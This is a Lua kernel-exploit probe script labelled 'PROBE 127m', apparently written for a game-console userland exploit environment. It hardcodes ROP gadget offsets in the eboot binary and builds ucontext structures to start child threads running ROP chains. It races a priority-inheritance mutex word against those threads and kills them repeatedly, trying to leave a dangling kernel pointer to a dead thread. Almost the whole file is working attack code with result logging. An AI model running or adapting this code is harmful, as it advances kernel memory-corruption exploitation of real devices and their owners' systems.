-- CRASH_CLASS: MODERATE
-- PROBE 127m: PI mutex dangling pointer via thread exit + ROP writer
--
-- Combines two confirmed findings:
-- 1. Child thread ROP chains (127j) — write to shared memory in loop
-- 2. PI mutex NOT cleaned on thread exit (engram #2731, probe 99c)
--
-- Attack: Create child threads that "own" a PI mutex (by userland word
-- manipulation), then exit them. The kernel's umtx_pi retains the dead
-- TID. Create a new child → if TID is recycled, umtx_pi now points to
-- a different thread's td struct → dangling pointer / type confusion.
--
-- Phase A: Baseline — verify thr_exit works from main-thread kill
-- Phase B: Lock PI mutex, desync word with child writer, unlock with
--          the desynchronized state → kernel slow-path on corrupted word
-- Phase C: Create/exit children to exhaust umtx_pi pool

print("=== PROBE 127m: PI DANGLING POINTER RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local function alive()
    return N(native.fcall_with_rax(stub, 20)) == pid
end

-- Eboot
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end
print(string.format("eboot=0x%X%08X", text_hi, text_lo))

local function eaddr(off)
    return uint64(string.format("0x%X%08X", text_hi, text_lo + off))
end

local G = {
    ret      = 0x42,
    pop_rax  = 0x992,
    pop_rsp  = 0x9A2,
    pop_rdi  = 0xC9DFE,
    mov_w    = 0x92C67,
    jmp_self = 0x15481,
}

local sc_umtx = mk(454)
local sc_thr  = mk(430)
local sc_kill = mk(433)

-- Shared memory layout
local shared   = memory.alloc(0x4000)
local S = N(shared)
local MTX      = S           -- mutex word
local EXIT_ST  = S + 8       -- exit state for child
local SENTINEL = S + 16      -- child write proof
local SCRATCH  = S + 0x100   -- per-round results

for off = 0, 0x3F8, 8 do wq(S + off, uint64("0x0")) end

-- [A] Get main TID + verify PI mutex ops
print("")
print("[A] PI mutex baseline")

wd(MTX, 0)
wd(MTX + 4, 0)
local lr = nil
pcall(function()
    lr = sc_umtx(shared, uint64(5), uint64(0), uint64(0), uint64(0), uint64(0))
end)
local main_tid = rd(MTX) or 0
if main_tid < 0 then main_tid = main_tid + 0x100000000 end
main_tid = main_tid % 0x80000000
print(string.format("  lock ret=%s main_tid=%d (0x%X)", fmt(lr), main_tid, main_tid))

-- Unlock
pcall(function()
    sc_umtx(shared, uint64(6), uint64(0), uint64(0), uint64(0), uint64(0))
end)
print(string.format("  unlock: word=0x%08X", rd(MTX) or 0))

if main_tid == 0 then main_tid = pid end
if not alive() then print("DIED!") return end

-- [B] Desync attack: lock PI mutex, child corrupts word, unlock
-- This forces kernel into slow-path unlock with mismatched state
print("")
print("[B] Desync attack — lock/corrupt/unlock")

-- Create child that writes 0xDEAD to mutex word in a loop
local stk1 = memory.alloc(0x4000)
local ctx1 = memory.alloc(0x500)
local tid1 = memory.alloc(8)
local STK1 = N(stk1)
local BC1  = N(ctx1)
local CB1  = STK1 + 0x3000

-- Child chain: write 0xDEAD to MTX, write sentinel, loop
wq(CB1 + 0x00, eaddr(G.pop_rdi))
wq(CB1 + 0x08, shared)                    -- rdi = &MTX
wq(CB1 + 0x10, eaddr(G.pop_rax))
wq(CB1 + 0x18, uint64("0xDEAD"))          -- fake TID
wq(CB1 + 0x20, eaddr(G.mov_w))

wq(CB1 + 0x28, eaddr(G.pop_rdi))
wq(CB1 + 0x30, uint64(string.format("0x%X", SENTINEL)))
wq(CB1 + 0x38, eaddr(G.pop_rax))
wq(CB1 + 0x40, uint64("0xBBBBBBBBBBBBBBBB"))
wq(CB1 + 0x48, eaddr(G.mov_w))

wq(CB1 + 0x50, eaddr(G.pop_rsp))
wq(CB1 + 0x58, uint64(string.format("0x%X", CB1)))

-- Build ucontext
for off = 0, 0x4BC, 4 do wd(BC1 + off, 0) end
wd(BC1 + 0x108, 0x480)
wd(BC1 + 0xD0, 0)
wd(BC1 + 0x110, 0x10000)
wd(BC1 + 0xC0, 0x43)
wd(BC1 + 0x100, 0x3B)

local rip_lo = (text_lo + G.ret) % 0x100000000
local rip_hi = text_hi + math.floor((text_lo + G.ret) / 0x100000000)
wd(BC1 + 0xE0, rip_lo)
wd(BC1 + 0xE4, rip_hi)
local rsp_lo = CB1 % 0x100000000
local rsp_hi = math.floor(CB1 / 0x100000000)
wd(BC1 + 0xF8, rsp_lo)
wd(BC1 + 0xFC, rsp_hi)

wq(N(tid1), uint64("0x0"))
local r1 = nil
pcall(function()
    r1 = sc_thr(ctx1, tid1, uint64(0))
end)
local child1_tid = rq(N(tid1))
print(string.format("  child1: ret=%s tid=%s", fmt(r1), fmt(child1_tid)))

-- Wait for sentinel
for i = 1, 100 do native.fcall_with_rax(stub, 20) end
local s1 = rq(SENTINEL)
print(string.format("  sentinel=%s %s", fmt(s1),
    (s1 and N(s1) ~= 0) and "RUNNING" or "NOT YET"))

if not alive() then print("DIED!") return end

-- Now the desync race: main locks, child corrupts, main unlocks
-- Use TRYLOCK to avoid deadlock
print("")
print("  desync race: 500 rounds of trylock/check/unlock")
local tl_ok = 0
local tl_busy = 0
local tl_crash = 0
local ul_ok = 0
local ul_fail = 0
local ul_crash = 0
local desync_count = 0

for iter = 1, 500 do
    -- Clear mutex word
    wd(MTX, 0)
    wd(MTX + 4, 0)

    -- TRYLOCK
    local tlr = nil
    local tlok = pcall(function()
        tlr = sc_umtx(shared, uint64(4), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    if not tlok then
        tl_crash = tl_crash + 1
    elseif tlr and N(tlr) == 0 then
        tl_ok = tl_ok + 1

        -- Check if child corrupted the word between our lock and now
        local snap = rd(MTX) or 0
        if snap < 0 then snap = snap + 0x100000000 end
        local expected_tid = main_tid % 0x100000000
        if snap ~= expected_tid and snap ~= (expected_tid + 0x80000000) then
            desync_count = desync_count + 1
        end

        -- UNLOCK with potentially corrupted word
        local ulr = nil
        local ulok = pcall(function()
            ulr = sc_umtx(shared, uint64(6), uint64(0), uint64(0), uint64(0), uint64(0))
        end)
        if not ulok then
            ul_crash = ul_crash + 1
        elseif ulr and N(ulr) == 0 then
            ul_ok = ul_ok + 1
        else
            ul_fail = ul_fail + 1
        end
    else
        tl_busy = tl_busy + 1
        -- Still try unlock to clean up
        pcall(function()
            sc_umtx(shared, uint64(6), uint64(0), uint64(0), uint64(0), uint64(0))
        end)
    end

    if not alive() then
        print(string.format("  *** DIED at iter %d ***", iter))
        print(string.format("  TL(ok=%d busy=%d crash=%d) UL(ok=%d fail=%d crash=%d) desync=%d",
            tl_ok, tl_busy, tl_crash, ul_ok, ul_fail, ul_crash, desync_count))
        return
    end

    if iter % 100 == 0 then
        print(string.format("  i=%d TL(ok=%d busy=%d crash=%d) UL(ok=%d fail=%d crash=%d) desync=%d",
            iter, tl_ok, tl_busy, tl_crash, ul_ok, ul_fail, ul_crash, desync_count))
    end
end

print(string.format("  FINAL: TL(ok=%d busy=%d crash=%d) UL(ok=%d fail=%d crash=%d) desync=%d",
    tl_ok, tl_busy, tl_crash, ul_ok, ul_fail, ul_crash, desync_count))

if not alive() then print("DIED!") return end

-- [C] Thread churn: create/exit children to leak umtx_pi objects
print("")
print("[C] PI leak via thread churn (5 rounds)")

-- Each round: lock mutex, create child, child writes its TID to word,
-- kill child, check if mutex word still shows dead TID
local leaked_pis = 0
local child_tids = {}

for round = 1, 5 do
    -- Lock mutex
    wd(MTX, 0)
    wd(MTX + 4, 0)
    pcall(function()
        sc_umtx(shared, uint64(5), uint64(0), uint64(0), uint64(0), uint64(0))
    end)

    -- Create a child that writes a unique marker to SCRATCH + round*8
    local stk_r = memory.alloc(0x4000)
    local ctx_r = memory.alloc(0x500)
    local tid_r = memory.alloc(8)
    local STK_R = N(stk_r)
    local BC_R  = N(ctx_r)
    local CB_R  = STK_R + 0x3000

    -- Child writes its marker and parks on jmp$
    local marker_addr = SCRATCH + round * 8
    wq(CB_R + 0x00, eaddr(G.pop_rdi))
    wq(CB_R + 0x08, uint64(string.format("0x%X", marker_addr)))
    wq(CB_R + 0x10, eaddr(G.pop_rax))
    wq(CB_R + 0x18, uint64(string.format("0x%X", 0xDEAD0000 + round)))
    wq(CB_R + 0x20, eaddr(G.mov_w))
    wq(CB_R + 0x28, eaddr(G.jmp_self))  -- park

    for off = 0, 0x4BC, 4 do wd(BC_R + off, 0) end
    wd(BC_R + 0x108, 0x480)
    wd(BC_R + 0xD0, 0)
    wd(BC_R + 0x110, 0x10000)
    wd(BC_R + 0xC0, 0x43)
    wd(BC_R + 0x100, 0x3B)
    wd(BC_R + 0xE0, rip_lo)
    wd(BC_R + 0xE4, rip_hi)
    local rsp_r = CB_R % 0x100000000
    local rsp_rh = math.floor(CB_R / 0x100000000)
    wd(BC_R + 0xF8, rsp_r)
    wd(BC_R + 0xFC, rsp_rh)

    wq(N(tid_r), uint64("0x0"))
    pcall(function() sc_thr(ctx_r, tid_r, uint64(0)) end)
    local ctid = rq(N(tid_r))
    local ctid_n = ctid and N(ctid) or 0

    -- Wait briefly
    for i = 1, 50 do native.fcall_with_rax(stub, 20) end

    -- Unlock the mutex (kernel state says we own it)
    pcall(function()
        sc_umtx(shared, uint64(6), uint64(0), uint64(0), uint64(0), uint64(0))
    end)

    -- Now TRYLOCK again — if child is alive, it might have corrupted word
    local post_word = rd(MTX) or 0
    if post_word < 0 then post_word = post_word + 0x100000000 end

    -- Kill child with SIGKILL (9) to force exit
    if ctid_n ~= 0 then
        pcall(function()
            sc_kill(ctid, uint64(9), uint64(0), uint64(0), uint64(0), uint64(0))
        end)
        child_tids[#child_tids + 1] = ctid_n
    end

    -- Wait for child to die
    for i = 1, 50 do native.fcall_with_rax(stub, 20) end

    -- Check if child is dead
    local alive_check = nil
    pcall(function()
        alive_check = sc_kill(uint64(ctid_n), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    local child_alive = alive_check and N(alive_check) == 0

    -- Check marker
    local marker = rq(marker_addr)

    print(string.format("  round=%d ctid=0x%X word=0x%08X child_alive=%s marker=%s",
        round, ctid_n, post_word, tostring(child_alive), fmt(marker)))

    if not alive() then
        print("  *** MAIN PROCESS DIED ***")
        return
    end
end

-- [D] Check if mutex ops still work after thread churn
print("")
print("[D] Post-churn mutex sanity")
wd(MTX, 0)
wd(MTX + 4, 0)
local post_lr = nil
pcall(function()
    post_lr = sc_umtx(shared, uint64(5), uint64(0), uint64(0), uint64(0), uint64(0))
end)
local post_word = rd(MTX) or 0
if post_word < 0 then post_word = post_word + 0x100000000 end
print(string.format("  lock ret=%s word=0x%08X", fmt(post_lr), post_word))
pcall(function()
    sc_umtx(shared, uint64(6), uint64(0), uint64(0), uint64(0), uint64(0))
end)

-- Report child TIDs for recycling analysis
print("")
print("[E] Thread TIDs observed:")
for i, t in ipairs(child_tids) do
    print(string.format("  child %d: 0x%X (%d)", i, t, t))
end

if child1_tid then
    print(string.format("  writer: 0x%X", N(child1_tid)))
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 127m COMPLETE ===")
